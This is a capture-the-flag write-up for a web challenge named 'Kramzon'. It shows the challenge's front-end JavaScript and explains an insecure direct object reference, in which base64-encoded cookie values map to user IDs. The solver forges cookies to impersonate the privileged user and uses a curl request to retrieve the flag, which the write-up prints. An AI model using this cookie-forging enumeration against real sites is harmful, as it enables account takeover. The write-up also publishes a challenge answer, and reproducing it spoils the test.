# Write-up of the challenge "Kramzon"

This challenge is part of the **"Web"** category and earns 57 points.

# Goal of the challenge

So the goal of this challenge is to order something and then somehow be user number 1 which is Santa and get special url to read the flag from.

# Program structure 
Cookie:
```
Auth=BA4FBg%3D%3D
```

Script.js:

```js
document.addEventListener("DOMContentLoaded", function () {
  // Hero Slider Logic
  const slides = document.querySelectorAll(".slide");
  const prevBtn = document.getElementById("prevBtn");
  const nextBtn = document.getElementById("nextBtn");
  let currentSlide = 0;
  let slideInterval;

  function showSlide(index) {
    slides.forEach((slide, i) => {
      slide.classList.remove("active");
      if (i === index) {
        slide.classList.add("active");
      }
    });
  }

  function nextSlide() {
    currentSlide = (currentSlide + 1) % slides.length;
    showSlide(currentSlide);
  }

  function prevSlide() {
    currentSlide = (currentSlide - 1 + slides.length) % slides.length;
    showSlide(currentSlide);
  }

  function startSlideShow() {
    slideInterval = setInterval(nextSlide, 5000); // Change slide every 5 seconds
  }

  function stopSlideShow() {
    clearInterval(slideInterval);
  }

  nextBtn.addEventListener("click", () => {
    nextSlide();
    stopSlideShow();
    startSlideShow();
  });

  prevBtn.addEventListener("click", () => {
    prevSlide();
    stopSlideShow();
    startSlideShow();
  });

  showSlide(currentSlide);
  startSlideShow();

  // Back to Top button
  const backToTopBtn = document.getElementById("backToTopBtn");
  backToTopBtn.addEventListener("click", () => {
    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  });
});

// :)
(async () => {
  const response = await fetch("https://ipapi.co/json/");
  const data = await response.json();

  const locationElement = document.getElementById("location");

  locationElement.textContent = `${data.city}, ${data.postal}`;
})();

document.getElementById("order").addEventListener("click", async () => {
  try {
    console.log("Creating order...");

    const createRes = await fetch("/create-order", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });
    const order = await createRes.json();

    console.log("[*] Waiting for status callback...");
    setTimeout(async () => {
      const callbackRes = await fetch(order.callback_url);
      const status = await callbackRes.json();

      function santaMagic(n) {
        return n ^ 0x37; // TODO: remove in production
      }

      if (status.internal.user === 1) {
        alert("Welcome, Santa! Allowing priority finalize...");
      }

      setTimeout(async () => {
        const finalizeRes = await fetch("/finalize", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            user: status.internal.user,
            order: order.order_id,
          }),
        });

        const finalize = await finalizeRes.json();
        console.log("Finalize response:", finalize);

        alert("Order completed. Thank you for your support to Krampus Syndicate!");
      }, 1000);
    }, 3000);
  } catch (err) {
    console.error("Error in workflow:", err);
  }
});

```

# Vulnerability

DOR (Insecure Direct Object Reference): 
The server mapped cookie values directly to user IDs without proper authentication

## Solution

So what we want is to be **Santa** and we can do that by being the user with id of **1** here's the code snippet that defines that:

```js
 if (status.internal.user === 1) {
        alert("Welcome, Santa! Allowing priority finalize...");
}
```

So since we know that the id is from the auth and that it is **b64 encoded**, we gotta try setting some numbers in base64 and then sending it to the **finalize endpoint**. I kept doing that from the number 0 up to the number 6 using **cyberchef** and number 6 gave me a strange result. From the curl command I ran I got this in return:

```js
Testing cookie: Bg==
Result: {'success': True, 'privileged': True, 'message': 'Order finalized with Santa-level priority!', 'internal_route': '/priority/manifest/route-2025-SANTA.txt', 'flag_hint': 'flag{npld_async_cookie_'}
```

So what we know is that there's a url at the endpoint **/priority/manifest/route-2025-SANTA.txt**, so what I did was just visit that!

```
curl -b "auth=Bg==" "https://kramazon.csd.lol/priority/manifest/route-2025-SANTA.txt"
# North Pole Logistics Directorate – PRIORITY ROUTE MANIFEST
# -----------------------------------------------------------

# FLAG:
# csd{npld_async_callback_idor_mastery}
```